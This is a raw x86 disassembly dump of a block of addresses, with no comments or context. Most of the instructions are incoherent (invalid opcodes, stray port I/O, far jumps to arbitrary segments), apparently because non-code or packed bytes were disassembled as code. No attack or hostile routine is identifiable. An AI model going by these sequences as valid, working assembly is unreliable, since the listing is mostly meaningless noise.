  41e5ab:	add    esp,DWORD PTR [ecx-0x243552b2]
  41e5b1:	or     BYTE PTR [ecx-0x1e03ad3e],0x15
  41e5b8:	jecxz  0x41e5aa
  41e5ba:	call   0x537e2841
  41e5bf:	fdivr  QWORD PTR [esi]
  41e5c1:	mov    eax,ds:0x48c52d29
  41e5c6:	xor    ch,cl
  41e5c8:	push   esp
  41e5c9:	inc    edi
  41e5ca:	jp     0x41e5ae
  41e5cc:	in     al,dx
  41e5cd:	and    esp,DWORD PTR [edi]
  41e5cf:	xor    al,0x3e
  41e5d1:	dec    esp
  41e5d2:	cwde   
  41e5d3:	cmp    ah,BYTE PTR [ebx]
  41e5d5:	jbe    0x41e5f4
  41e5d7:	sbb    eax,0xc0c0cd40
  41e5dc:	neg    DWORD PTR [esi+0x33aeb997]
  41e5e2:	call   0x5511:0x1f86de12
  41e5e9:	cmp    DWORD PTR [esi-0x747a46d2],ebp
  41e5ef:	adc    bh,BYTE PTR [edx]
  41e5f1:	xor    al,0x11
  41e5f3:	(bad)  
  41e5f4:	cdq    
  41e5f5:	inc    edx
  41e5f6:	je     0x41e61f
  41e5f8:	xchg   edx,eax
  41e5f9:	scas   eax,DWORD PTR es:[edi]
  41e5fa:	aaa    
  41e5fb:	inc    ebx
  41e5fc:	mul    BYTE PTR [eax+edx*4]
  41e5ff:	outs   dx,BYTE PTR ds:[esi]
  41e600:	xor    BYTE PTR [edx+esi*2],dl
  41e603:	out    0x12,al
  41e605:	outs   dx,DWORD PTR ds:[esi]
  41e606:	lock mov esi,0xbe15c
  41e60c:	in     eax,dx
  41e60d:	das    
  41e60e:	xor    DWORD PTR [ebx-0x3a],edx
  41e611:	sbb    BYTE PTR [ecx],0x75
  41e614:	pop    ebp
  41e615:	jns    0x41e5c1
  41e617:	cld    
  41e618:	or     ch,ch
  41e61a:	les    ecx,FWORD PTR [ebx]
  41e61c:	xchg   edx,eax
  41e61d:	scas   al,BYTE PTR es:[edi]
  41e61e:	adc    bl,BYTE PTR [eax+0x2f267290]
  41e624:	pop    ss
  41e625:	jnp    0x41e61e
  41e627:	add    esp,DWORD PTR [ebp-0x49089a73]
  41e62d:	sti    
  41e62e:	mov    edx,0xaae1a229
  41e633:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e634:	test   DWORD PTR [edi],ebx
  41e636:	sbb    bh,BYTE PTR [ebx+0xf83e9b4]
  41e63c:	push   cs
  41e63d:	shl    BYTE PTR [ebx+0x75],cl
  41e640:	pop    esi
  41e641:	fist   DWORD PTR [ecx-0x78]
  41e644:	push   ebp
  41e645:	mul    DWORD PTR [ebx]
  41e647:	stos   BYTE PTR es:[edi],al
  41e648:	pop    ecx
  41e649:	cmp    eax,0x6df9a6a9
  41e64e:	ss mov esi,0xd64b42dc
  41e654:	push   ds
  41e655:	fistp  WORD PTR [eax-0x18]
  41e658:	cmp    BYTE PTR [edi+0x2c5a81f2],bl
  41e65e:	push   ds
  41e65f:	or     BYTE PTR [ecx],bl
  41e661:	inc    ebp
  41e662:	sub    eax,0x3821c132
  41e667:	jnp    0x41e69b
  41e669:	or     cl,BYTE PTR [esi-0x68]
  41e66c:	into   
  41e66d:	add    eax,0xb94d5c0b
  41e672:	dec    edi
  41e673:	in     eax,dx
  41e674:	cmp    cl,cl
  41e676:	adc    eax,0x4def4a4e
  41e67b:	outs   dx,DWORD PTR ds:[esi]
  41e67c:	repnz add al,0xc2
  41e67f:	call   0x74efd2e8
  41e684:	ins    DWORD PTR es:[edi],dx
  41e685:	out    0x2,al
  41e687:	test   eax,0xff290a8d
  41e68c:	jmp    0x41e683
  41e68e:	mov    dh,0x1a
  41e690:	ins    DWORD PTR es:[edi],dx
  41e691:	nop
  41e692:	push   ss
  41e693:	inc    ecx
  41e694:	loopne 0x41e652
  41e696:	or     eax,0xe9d95a34
  41e69b:	lods   al,BYTE PTR ds:[esi]
  41e69c:	retf   0x3a9f
  41e69f:	ins    BYTE PTR es:[edi],dx
  41e6a0:	jbe    0x41e712
  41e6a2:	xlat   BYTE PTR ds:[ebx]
  41e6a3:	int    0xe3
  41e6a5:	adc    ah,bh
  41e6a7:	xor    ebx,DWORD PTR [eax]
  41e6a9:	cmp    al,BYTE PTR [esi]
  41e6ab:	stos   BYTE PTR es:[edi],al
  41e6ac:	xor    BYTE PTR [esi],dl
  41e6ae:	jp     0x41e673
  41e6b0:	test   DWORD PTR [esi],edi
  41e6b2:	pushf  
  41e6b3:	mov    dh,0x18
  41e6b5:	dec    esi
  41e6b6:	push   ebx
  41e6b7:	dec    esp
  41e6b8:	lahf   
  41e6b9:	pop    esi
  41e6ba:	hlt    
  41e6bb:	xchg   BYTE PTR fs:[esi],ch
  41e6be:	fwait
  41e6bf:	cli    
  41e6c0:	adc    eax,0xba26a1f6
  41e6c5:	adc    ebx,DWORD PTR [esi+0x2507e4a4]
  41e6cb:	mov    ebp,0x7a60c8d7
  41e6d0:	bound  edx,QWORD PTR [eax]
  41e6d2:	xchg   ch,bh
  41e6d4:	fcmovnb st,st(0)
  41e6d6:	cmp    al,0x48
  41e6d8:	pop    ds
  41e6d9:	sbb    BYTE PTR [esi],ch
  41e6db:	test   al,0xf1
  41e6dd:	mov    ds:0xcabbb5e5,al
  41e6e2:	ja     0x41e6f0
  41e6e4:	jg     0x41e68d
  41e6e6:	dec    eax
  41e6e7:	jno    0x41e6b0
  41e6e9:	push   eax
  41e6ea:	retf   0x7088
  41e6ed:	sub    BYTE PTR [esi],cl
  41e6ef:	mov    bl,0x3e
  41e6f1:	arpl   WORD PTR [eax],sp
  41e6f3:	cmp    al,0x43
  41e6f5:	jmp    0x41e720
  41e6f7:	sub    DWORD PTR [ebp+0x30],edx
  41e6fa:	ins    BYTE PTR es:[edi],dx
  41e6fb:	add    DWORD PTR [ebp-0x1a],ebp
  41e6fe:	xchg   ebx,eax
  41e6ff:	jmp    0x529b:0xf6013428
  41e706:	add    esi,ebx
  41e708:	imul   esi,DWORD PTR [edx*8-0x524ee5f1],0xffffffdc
  41e710:	or     eax,0x9ece9e1c
  41e715:	das    
  41e716:	iret   
  41e717:	pop    ss
  41e718:	sub    DWORD PTR [ebp-0x267a3f95],0x4bf6eea1
  41e722:	pushf  
  41e723:	jmp    0x41e77f
  41e725:	out    dx,al
  41e726:	dec    ecx
  41e727:	outs   dx,DWORD PTR ds:[esi]
  41e728:	cwde   
  41e729:	div    BYTE PTR [esi-0x1c]
  41e72c:	pop    esi
  41e72d:	fbstp  TBYTE PTR [esi]
  41e72f:	mov    dh,al
  41e731:	ss pusha 
  41e733:	ret    0xecf5
  41e736:	mov    ecx,0xdfc4f808
  41e73b:	lds    edi,FWORD PTR [edx-0x47]
  41e73e:	adc    al,0xf2
  41e740:	inc    esi
  41e741:	enter  0xb7a1,0xa5
  41e745:	aas    
  41e746:	rcl    DWORD PTR [ecx],0x17
  41e749:	mov    ecx,0xd234a986
  41e74e:	test   BYTE PTR [ecx-0x70],dl
  41e751:	sbb    ebp,edi
  41e753:	sahf   
  41e754:	icebp  
  41e755:	lea    edi,[ebx]
  41e757:	adc    eax,0x82bd1771
  41e75c:	pop    fs
  41e75e:	cmp    BYTE PTR [esi-0x32af6a47],dh
  41e764:	sub    DWORD PTR [edx-0x64],0x2d
  41e768:	lods   al,BYTE PTR ds:[esi]
  41e769:	test   eax,ebx
  41e76b:	cwde   
  41e76c:	ds adc al,0xf9
  41e76f:	sahf   
  41e770:	pop    ds
  41e771:	jne    0x41e7a7
  41e773:	lods   eax,DWORD PTR ds:[esi]
  41e774:	push   esp
  41e775:	jmp    0xe717:0x9ee41aec
  41e77c:	pop    ds
  41e77d:	stos   BYTE PTR es:[edi],al
  41e77e:	sub    esp,DWORD PTR [esi]
  41e780:	xchg   edx,eax
  41e781:	scas   eax,DWORD PTR es:[edi]
  41e782:	jle    0x41e7b7
  41e784:	adc    DWORD PTR [edi+0x69f581d8],ebp
  41e78a:	mov    bh,0xc4
  41e78c:	xchg   ebp,eax
  41e78d:	xor    DWORD PTR [ecx-0x59887c97],edi
  41e793:	sbb    bh,BYTE PTR [esi+0xe]
  41e796:	jno    0x41e803
  41e798:	stos   DWORD PTR es:[edi],eax
  41e799:	ret    
  41e79a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e79b:	mov    cl,0x34
  41e79d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e79e:	or     eax,0xd5bed4b3
  41e7a3:	out    dx,eax
  41e7a4:	add    dl,BYTE PTR [ebp+ecx*4+0x7f14c4d3]
  41e7ab:	sahf   
  41e7ac:	mov    al,ds:0x65edb7f0
  41e7b1:	sbb    cl,0x8d
  41e7b4:	mov    eax,esp
  41e7b6:	sbb    DWORD PTR [edi+ebp*2],ebx
  41e7b9:	xchg   edi,eax
  41e7ba:	loopne 0x41e801
  41e7bc:	mov    BYTE PTR [edi],bh
  41e7be:	outs   dx,BYTE PTR ds:[esi]
  41e7bf:	sti    
  41e7c0:	push   es
  41e7c1:	dec    edi
  41e7c2:	xchg   ecx,eax
  41e7c3:	push   cs
  41e7c4:	fcmove st,st(6)
  41e7c6:	mov    ebx,0x64328896
  41e7cb:	dec    edx
  41e7cc:	int3   
  41e7cd:	out    0x2e,eax
  41e7cf:	fcomp  QWORD PTR [ebp+0x5a8b3d08]
  41e7d5:	pop    ds
  41e7d6:	sbb    esp,DWORD PTR [esi]
  41e7d8:	shl    cl,cl
  41e7da:	xor    eax,DWORD PTR [ebx-0x5c24696f]
  41e7e0:	push   ss
  41e7e1:	shl    cl,0x55
  41e7e4:	xchg   edi,eax
  41e7e5:	push   edx
  41e7e6:	inc    edx
  41e7e7:	push   edx
  41e7e8:	and    al,0x76
  41e7ea:	and    DWORD PTR [esi+0x46],eax
  41e7ed:	stos   DWORD PTR es:[edi],eax
  41e7ee:	adc    ebx,DWORD PTR [edx]
  41e7f0:	sub    eax,0xca9cd91b
  41e7f5:	lods   eax,DWORD PTR ds:[esi]
  41e7f6:	test   al,0xee
  41e7f9:	pop    DWORD PTR [eax+0x42d4a02e]
  41e7ff:	sbb    al,BYTE PTR ds:0x37461b11
  41e805:	pop    ebp
  41e806:	mov    bl,0x5a
  41e808:	push   ebx
  41e809:	push   edi
  41e80a:	call   0x41594e
  41e80f:	mov    esi,DWORD PTR [ebp-0x228]
  41e815:	cmp    esi,eax
  41e817:	jmp    0x41ebfe
  41e81c:	mov    dh,0x8
  41e81e:	xor    al,0xa5
  41e820:	mov    ah,0xb9
  41e822:	mov    esp,0xddc4c918
  41e827:	nop
  41e828:	adc    BYTE PTR [edi-0x54],ch
  41e82b:	jecxz  0x41e7d4
  41e82d:	outs   dx,DWORD PTR ds:[esi]
  41e82e:	sar    BYTE PTR [esi-0x41413bb6],0xce
  41e835:	mov    al,0x74
  41e837:	xchg   edx,eax
  41e838:	js     0x41e83b
  41e83a:	ud2    
  41e83c:	aad    0xfe
  41e83e:	mov    edx,0x29a98849
  41e843:	sbb    al,0xc0
  41e845:	mov    ah,0x94
  41e847:	fstp   st(6)
  41e849:	jle    0x41e7fb
  41e84b:	mov    edi,0xe458cd91
  41e850:	mov    ss,WORD PTR [ecx+0x58d0f108]
  41e856:	sub    DWORD PTR [esi-0x54],esi
  41e859:	sub    esp,DWORD PTR [edx+0x2e1eaec3]
  41e85f:	out    0x2e,al
  41e861:	je     0x41e7f9
  41e863:	int    0xc0
  41e865:	repz adc eax,DWORD PTR [ecx]
  41e868:	out    dx,eax
  41e869:	call   0xff258d62
  41e86e:	push   esi
  41e86f:	push   ds
  41e870:	xor    eax,0x2193dd58
  41e875:	jo     0x41e8ac
  41e877:	dec    eax
  41e878:	jno    0x41e875
  41e87a:	mov    cl,0xd4
  41e87c:	pop    ds
  41e87d:	pop    edx
  41e87e:	bound  ecx,QWORD PTR [edx-0x79f09f12]
  41e884:	cmp    dh,BYTE PTR [ecx+0x1f8b50a7]
  41e88a:	test   BYTE PTR [ecx-0x73d2e8a0],dl
  41e890:	loopne 0x41e84f
  41e892:	sar    al,0xd4
  41e895:	push   ebp
  41e896:	retf   0x5e2
  41e899:	pop    ebx
  41e89a:	adc    DWORD PTR [edi-0x242c86e6],0xffffff80
  41e8a1:	jne    0x41e8ab
  41e8a3:	xchg   ebx,eax
  41e8a4:	call   0xb58ba1e9
  41e8a9:	xchg   ecx,eax
  41e8aa:	jecxz  0x41e82f
  41e8ac:	mov    dl,0x1a
  41e8ae:	sub    DWORD PTR [eax+0x4d],0x68fc88bd
  41e8b5:	cmp    eax,ebp
  41e8b7:	out    dx,al
  41e8b8:	pop    edx
  41e8b9:	sub    al,0x2d
  41e8bb:	add    BYTE PTR [ecx+0x52],cl
  41e8be:	scas   al,BYTE PTR es:[edi]
  41e8bf:	mov    edx,0x9069dfbe
  41e8c4:	adc    eax,0xfa7dcfbc
  41e8c9:	pop    edi
  41e8ca:	or     eax,0x206bc335
  41e8cf:	cmp    eax,0x30156e04
  41e8d4:	call   0x802:0x13886b58
  41e8db:	sub    BYTE PTR [ebx+ebx*2+0x1],ah
  41e8df:	mov    eax,ds:0x5567f5d5
  41e8e4:	(bad)  
  41e8e5:	rcr    BYTE PTR [esi+0x1c],1
  41e8e8:	push   ss
  41e8e9:	push   esp
  41e8ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8eb:	fisub  DWORD PTR [ebp+0x46e767e7]
  41e8f1:	dec    esi
  41e8f2:	jnp    0x41e8c0
  41e8f4:	loopne 0x41e8ab
  41e8f6:	pop    edi
  41e8f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8f8:	xor    ebp,DWORD PTR [esi-0x5c]
  41e8fb:	retf   
  41e8fc:	cli    
  41e8fd:	js     0x41e976
  41e8ff:	lods   al,BYTE PTR ds:[esi]
  41e900:	(bad)
  41e903:	repz ret 
  41e905:	pop    esp
  41e906:	mov    edi,0x88548c1
  41e90b:	cdq    
  41e90c:	shl    BYTE PTR gs:[edi],0xa9
  41e910:	bound  ebx,QWORD PTR [edx+0x5f0e23bd]
  41e916:	push   ds
  41e917:	dec    esi
  41e918:	nop
  41e919:	fsubr  st(1),st
  41e91b:	xchg   ebp,eax
  41e91c:	sub    al,0xbf
  41e91e:	cmp    DWORD PTR [eax],esp
  41e920:	pop    eax
  41e921:	sti    
  41e922:	sahf   
  41e923:	lods   eax,DWORD PTR ds:[esi]
  41e924:	and    eax,DWORD PTR [esi+0x66ead566]
  41e92a:	sbb    eax,0x6b7eeea0
  41e92f:	jnp    0x41e949
  41e931:	mov    edx,0xd1f26e27
  41e936:	cmp    ch,0x9e
  41e939:	mov    BYTE PTR [eax],ch
  41e93b:	arpl   WORD PTR [ebp+edi*4+0x28],bp
  41e93f:	call   0x51fe:0xd0630ae1
  41e946:	and    eax,0xb8cacfb2
  41e94b:	jbe    0x41e922
  41e94d:	out    dx,eax
  41e94e:	sbb    bl,dl
  41e950:	xchg   ebp,eax
  41e951:	jl     0x41e947
  41e953:	jb     0x41e97a
  41e955:	stos   DWORD PTR es:[edi],eax
  41e956:	mov    dl,0xfc
  41e958:	ret    0x6ffe
  41e95b:	(bad)  
  41e95c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e95d:	bound  edi,QWORD PTR [ebp-0x27]
  41e960:	add    dh,BYTE PTR [edx-0x48]
  41e963:	dec    ebx
  41e964:	fimul  DWORD PTR [edi+edx*2]
  41e967:	and    DWORD PTR [ebx-0x4d],0x7d62fedc
  41e96e:	or     ebx,ebx
  41e970:	mov    esp,0xf8ff3d33
  41e975:	mov    eax,ds:0x86e6cfee
  41e97a:	inc    ebx
  41e97b:	dec    eax
  41e97c:	lock sar BYTE PTR [esi+0x1f],cl
  41e980:	retf   
  41e981:	push   esi
  41e982:	call   FWORD PTR ds:0xb2e98e3
  41e988:	call   0xb03939ab
  41e98d:	sbb    bl,BYTE PTR [eax+0x7128c402]
  41e993:	jnp    0x41e952
  41e995:	sub    ecx,ebx
  41e997:	xchg   esi,eax
  41e998:	xchg   ebx,eax
  41e999:	int    0x54
  41e99b:	pop    ecx
  41e99c:	pop    es
  41e99d:	mov    eax,DWORD PTR [ebx-0x26dc1055]
  41e9a3:	push   esp
  41e9a4:	je     0x41e96c
  41e9a6:	imul   esp,esp,0x32d561f2
  41e9ac:	sbb    al,0x8b
  41e9ae:	fwait
  41e9af:	jae    0x41e9a0
  41e9b1:	fnstenv [esi-0x42986e17]
  41e9b7:	jmp    0xdf20781a
  41e9bc:	cmp    BYTE PTR [edx-0x232a0c40],ah
  41e9c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e9c3:	xchg   esp,eax
  41e9c4:	cmp    esi,DWORD PTR [ebp+0x51]
  41e9c7:	jle    0x41ea43
  41e9c9:	fwait
  41e9ca:	jno    0x41e97a
  41e9cc:	jp     0x41ea44
  41e9ce:	add    al,0x7
  41e9d0:	dec    esp
  41e9d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9d2:	fdiv   QWORD PTR [eax]
  41e9d4:	out    0x81,eax
  41e9d6:	mov    BYTE PTR [edx-0x6b],al
  41e9d9:	and    al,0xc0
  41e9db:	mov    dh,0x9c
  41e9dd:	ins    DWORD PTR es:[edi],dx
  41e9de:	and    al,BYTE PTR [ebx+0x31]
  41e9e1:	mov    gs,WORD PTR [eax-0x23574c81]
  41e9e7:	cmp    eax,0x94626b92
  41e9ec:	fwait
  41e9ed:	mov    ebx,DWORD PTR [esi+0x49]
  41e9f0:	mov    ecx,0x5423eb64
  41e9f5:	cmp    al,0xcc
  41e9f7:	or     al,0x67
  41e9f9:	jecxz  0x41e9e1
  41e9fb:	jns    0x41e9b8
  41e9fd:	jb     0x41ea7e
  41e9ff:	sbb    DWORD PTR [ebx+ecx*4+0x2a],eax
  41ea03:	leave  
  41ea04:	(bad)  [edi+0x8b8175c]
  41ea0a:	and    al,0xe5
  41ea0c:	call   0x2d80:0x810d3065
  41ea13:	inc    esi
  41ea14:	mov    esi,0x6e7f6467
  41ea19:	or     eax,0xce75f97f
  41ea1e:	icebp  
  41ea1f:	daa    
  41ea20:	(bad)  
  41ea21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea22:	adc    dh,BYTE PTR [esi+esi*8]
  41ea25:	out    dx,al
  41ea26:	and    BYTE PTR [edi+0x21e6011f],0xca
  41ea2d:	xchg   DWORD PTR [esi+esi*8+0x28],edx
  41ea31:	cmp    DWORD PTR [eax-0x4b],eax
  41ea34:	scas   al,BYTE PTR es:[edi]
  41ea35:	pop    es
  41ea36:	call   0xad71:0xa7149d17
  41ea3d:	sub    DWORD PTR [ecx+eax*4],ecx
  41ea40:	adc    al,ch
  41ea42:	bound  esi,QWORD PTR [eax+0x6a]
  41ea45:	(bad)  
  41ea46:	jnp    0x41ea22
  41ea48:	pop    eax
  41ea49:	test   BYTE PTR [edx+0x30c7ba55],bh
  41ea4f:	mov    dh,0x80
  41ea51:	out    0x3b,al
  41ea53:	xchg   ebp,eax
  41ea54:	add    BYTE PTR [esi-0x203fecb9],bh
  41ea5a:	mov    ss,WORD PTR [ebp+0x48]
  41ea5d:	xchg   edx,eax
  41ea5e:	ret    
  41ea5f:	(bad)  [esi+0x74]
  41ea62:	or     esi,esi
  41ea64:	dec    esp
  41ea65:	aaa    
  41ea66:	fist   DWORD PTR [edx+edx*4+0x5e]
  41ea6a:	dec    edi
  41ea6b:	dec    ebx
  41ea6c:	sub    eax,0x6a8370ce
  41ea71:	sub    al,0x3b
  41ea73:	stos   BYTE PTR es:[edi],al
  41ea74:	sub    DWORD PTR [ecx-0x6e],eax
  41ea77:	out    dx,eax
  41ea78:	pop    esi
  41ea79:	cli    
  41ea7a:	push   esp
  41ea7b:	daa    
  41ea7c:	mov    al,BYTE PTR [ebx]
  41ea7e:	dec    DWORD PTR ds:0x6eca57f7
  41ea84:	pop    edi
  41ea85:	jg     0x41ea44
  41ea87:	in     al,0x80
  41ea89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea8a:	mov    al,0xae
  41ea8c:	sub    DWORD PTR [ebp-0x64],ecx
  41ea8f:	retf   
  41ea90:	ret    0x322c
  41ea93:	push   0xd3908c1c
  41ea98:	cmc    
  41ea99:	scas   eax,DWORD PTR es:[edi]
  41ea9a:	mov    esi,0xd370fe67
  41ea9f:	cdq    
  41eaa0:	and    ch,BYTE PTR [ebx-0x7ed14370]
  41eaa6:	daa    
  41eaa7:	mov    esi,DWORD PTR [ebx+0x75]
  41eaaa:	retf   
  41eaab:	ret    0x570c
  41eaae:	push   0xe177c605
  41eab3:	pop    edi
  41eab4:	push   es
  41eab5:	mov    ds:0xc6310c7c,eax
  41eaba:	fisub  DWORD PTR [ebp+0x1b]
  41eabd:	add    BYTE PTR [edx],cl
  41eabf:	mov    ecx,0x91f3cfe9
  41eac4:	push   edi
  41eac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eac6:	xchg   esp,eax
  41eac7:	mov    ebp,0x83144f4
  41eacc:	mov    dh,ah
  41eace:	push   eax
  41eacf:	mov    eax,ds:0x22e1a133
  41ead4:	dec    ecx
  41ead5:	jp     0x41ea6d
  41ead7:	(bad)  
  41ead8:	scas   eax,DWORD PTR es:[edi]
  41ead9:	sub    al,0x41
  41eadb:	sub    DWORD PTR [edx-0x8825bbb],ecx
  41eae1:	push   es
  41eae2:	push   ecx
  41eae3:	cli    
  41eae4:	bsf    eax,DWORD PTR [ecx+eiz*1+0x53]
  41eae9:	push   0xffffffc9
  41eaeb:	je     0x41eb27
  41eaed:	ins    BYTE PTR es:[edi],dx
  41eaee:	push   ss
  41eaef:	je     0x41eadd
  41eaf1:	mov    ebp,ebp
  41eaf3:	adc    al,0x6c
  41eaf5:	popf   
  41eaf6:	enter  0x7eb9,0x1f
  41eafa:	hlt    
  41eafb:	push   es
  41eafc:	retf   0x7b74
  41eaff:	(bad)  
  41eb00:	mov    ebx,0x53c4fdb3
  41eb05:	out    dx,eax
  41eb06:	jl     0x41eab7
  41eb08:	stos   DWORD PTR es:[edi],eax
  41eb09:	push   ss
  41eb0a:	sbb    al,bh
  41eb0c:	dec    ecx
  41eb0d:	mov    ah,0xb
  41eb0f:	js     0x41ea96
  41eb11:	sbb    al,0xc1
  41eb13:	mov    bh,0x4f
  41eb15:	cld    
  41eb16:	jae    0x41eb43
  41eb18:	or     ecx,DWORD PTR [edi]
  41eb1a:	sub    al,dh
  41eb1c:	arpl   WORD PTR [eax],cx
  41eb1e:	daa    
  41eb1f:	dec    esp
  41eb20:	in     al,dx
  41eb21:	adc    BYTE PTR [ecx-0x1ab1e8c5],dl
  41eb27:	fistp  DWORD PTR ds:0x786946f1
  41eb2d:	retf   
  41eb2e:	mov    BYTE PTR [edx+edx*2],bh
  41eb31:	adc    esp,DWORD PTR [edi-0x7f]
  41eb34:	mov    ebp,0xa650d387
  41eb39:	repz dec ebx
  41eb3b:	pop    es
  41eb3c:	mov    ds:0x66ff294,al
  41eb41:	into   
  41eb42:	std    
  41eb43:	(bad)  
  41eb44:	ror    DWORD PTR [ecx-0x26],1
  41eb47:	mov    esi,0x49c5fa65
  41eb4c:	jg     0x41eb6b
  41eb4e:	push   ebx
  41eb4f:	mov    esp,0xfb91150
  41eb54:	popa   
  41eb55:	aaa    
  41eb56:	xor    DWORD PTR [edi+0xd96b192],ebx
  41eb5c:	jl     0x41eb85
  41eb5e:	aaa    
  41eb5f:	je     0x41eb94
  41eb61:	ins    BYTE PTR es:[edi],dx
  41eb62:	pop    ds
  41eb63:	jo     0x41eb8a
  41eb65:	sbb    esi,DWORD PTR [ebx]
  41eb67:	sub    edi,ebx
  41eb69:	adc    BYTE PTR [eax+0x59],cl
  41eb6c:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41eb6e:	push   0x58
  41eb70:	sub    bh,BYTE PTR [esi]
  41eb72:	sbb    dh,BYTE PTR [eax-0x36]
  41eb75:	retf   0x846a
  41eb78:	pop    ebp
  41eb79:	and    BYTE PTR [ecx+0x10f8a73f],ch
  41eb7f:	xor    ecx,DWORD PTR [esi+0x64b9cc2a]
  41eb85:	cmp    WORD PTR [esi-0x64],bp
  41eb89:	fnsave [ebx-0x6f]
  41eb8c:	mov    bh,0x38
  41eb8e:	fs push esi
  41eb90:	cwde   
  41eb91:	push   es
  41eb92:	push   edi
  41eb93:	test   eax,0xd90149d1
  41eb98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb99:	shl    BYTE PTR [ecx+0x69],cl
  41eb9c:	rol    BYTE PTR [edx-0x181a8a4a],cl
  41eba2:	xchg   DWORD PTR [eax+esi*1],ecx
  41eba5:	push   eax
  41eba6:	retf   
  41eba7:	push   edi
  41eba8:	mov    ds:0x9e1a3c13,al
  41ebad:	jle    0x41eb52
  41ebaf:	hlt    
  41ebb0:	ja     0x41eb48
  41ebb2:	test   al,0x17
  41ebb4:	outs   dx,DWORD PTR ds:[esi]
  41ebb5:	xor    ecx,DWORD PTR [edx]
  41ebb7:	out    dx,eax
  41ebb8:	sbb    ebp,DWORD PTR [ebx]
  41ebba:	call   0xe0c60e98
  41ebbf:	mov    DWORD PTR [esi+eiz*8+0x2596151b],ebp
  41ebc6:	mov    ch,0x78
  41ebc8:	pop    ecx
  41ebc9:	add    esi,DWORD PTR [ecx+0x17]
  41ebcc:	cdq    
  41ebcd:	cli    
  41ebce:	mov    ds:0xffb303aa,al
  41ebd3:	jmp    0x4586acfd
  41ebd8:	lds    ecx,FWORD PTR gs:[ecx-0x7e]
  41ebdc:	xor    ebp,ebx
  41ebde:	outs   dx,BYTE PTR ds:[esi]
  41ebdf:	dec    esp
  41ebe0:	lea    ebx,[ebx+0x7a]
  41ebe3:	sbb    edx,DWORD PTR [ebx-0x260b3409]
  41ebe9:	mov    cl,0xfb
  41ebeb:	dec    ecx
  41ebec:	push   ss
  41ebed:	pop    es
  41ebee:	mov    ecx,0x10c78921
  41ebf3:	jle    0x41eb8c
  41ebf5:	sbb    al,0xc3
  41ebf7:	test   eax,0x23988043
  41ebfc:	repnz xchg ebx,eax
  41ebfe:	je     0x41f05a
  41ec04:	mov    eax,DWORD PTR [ebp-0x154]
  41ec0a:	jmp    0x41eff1
  41ec0f:	cld    
  41ec10:	sbb    eax,0x6c1c4604
  41ec15:	mov    esp,0x10e976b3
  41ec1a:	sahf   
  41ec1b:	scas   al,BYTE PTR es:[edi]
  41ec1c:	fdivr  DWORD PTR [edi-0x3f88cc31]
  41ec22:	mov    esi,0xbebec44a
  41ec27:	push   ebp
  41ec28:	push   cs
  41ec29:	ret    0xfdc3
  41ec2c:	push   es
  41ec2d:	adc    bh,BYTE PTR ds:0x4a812562
  41ec33:	pop    cx
  41ec35:	sub    eax,0x3d49d8b2
  41ec3a:	pop    DWORD PTR [ebx]
  41ec3c:	sbb    DWORD PTR [ebp-0x3e4d3646],ebx
  41ec42:	mov    esi,DWORD PTR [esi+esi*4-0x79]
  41ec46:	mov    ebx,0xae9b7ee1
  41ec4b:	fisub  WORD PTR [ebx-0x5e]
  41ec4e:	mul    BYTE PTR [esi]
  41ec50:	xor    DWORD PTR [edi+0x4623bca9],esp
  41ec56:	js     0x41ec76
  41ec58:	addr16 jno 0x41ec28
  41ec5b:	popa   
  41ec5c:	popf   
  41ec5d:	(bad)  
  41ec5e:	mov    al,BYTE PTR [ebx-0x43b6269b]
  41ec64:	sub    BYTE PTR [ebx+esi*8+0x11],0x40
  41ec69:	ss jne 0x41ec7f
  41ec6c:	xor    al,0xfb
  41ec6e:	out    0xc2,eax
  41ec70:	pop    ebx
  41ec71:	scas   eax,DWORD PTR es:[edi]
  41ec72:	mov    DWORD PTR [esi+0x3a],esi
  41ec75:	xor    al,0x9e
  41ec77:	dec    edx
  41ec78:	inc    ebx
  41ec79:	popf   
  41ec7a:	and    al,0xde
  41ec7c:	out    0x6f,al
  41ec7e:	and    eax,0xb0291578
  41ec83:	cmp    eax,0xe2c32c47
  41ec88:	jo     0x41eca0
  41ec8a:	sbb    al,BYTE PTR [ebx+eax*2+0x614ea437]
  41ec91:	out    dx,eax
  41ec92:	outs   dx,DWORD PTR ds:[esi]
  41ec93:	fdivr  st(2),st
  41ec95:	iret   
  41ec96:	xchg   esi,eax
  41ec97:	cs xchg edi,eax
  41ec99:	inc    esi
  41ec9a:	or     dl,BYTE PTR [esi+0x605eaf34]
  41eca0:	in     eax,dx
  41eca1:	mov    DWORD PTR [edx],ebp
  41eca3:	cdq    
  41eca4:	mov    esi,0xd9e71adc
  41eca9:	fidivr WORD PTR [ecx-0x7b]
  41ecac:	and    eax,0x802d7dc9
  41ecb1:	jl     0x41ed09
  41ecb3:	mov    edx,0xe93e90fa
  41ecb8:	inc    esp
  41ecb9:	jnp    0x41ec51
  41ecbb:	data16 jns 0x41ec5c
  41ecbe:	inc    ebx
  41ecbf:	xchg   edi,eax
  41ecc0:	inc    ebp
  41ecc1:	mov    ds:0xa363ae2d,al
  41ecc6:	rcr    ah,cl
  41ecc8:	pop    esi
  41ecc9:	push   esp
  41ecca:	je     0x41ec91
  41eccc:	fdivr  QWORD PTR es:[ebx+0x5e]
  41ecd0:	dec    ecx
  41ecd1:	pop    ds
  41ecd2:	or     al,dh
  41ecd4:	ds xchg edx,eax
  41ecd6:	xor    al,0x59
  41ecd8:	ins    BYTE PTR es:[edi],dx
  41ecd9:	cmp    ecx,DWORD PTR [edx+0x2f]
  41ecdc:	popa   
  41ecdd:	in     al,dx
  41ecde:	mov    esp,0xaee47d6d
  41ece3:	push   edx
  41ece4:	scas   al,BYTE PTR es:[edi]
  41ece5:	and    DWORD PTR [ebp-0x5507e4a6],ebp
  41eceb:	ficomp DWORD PTR [ebx]
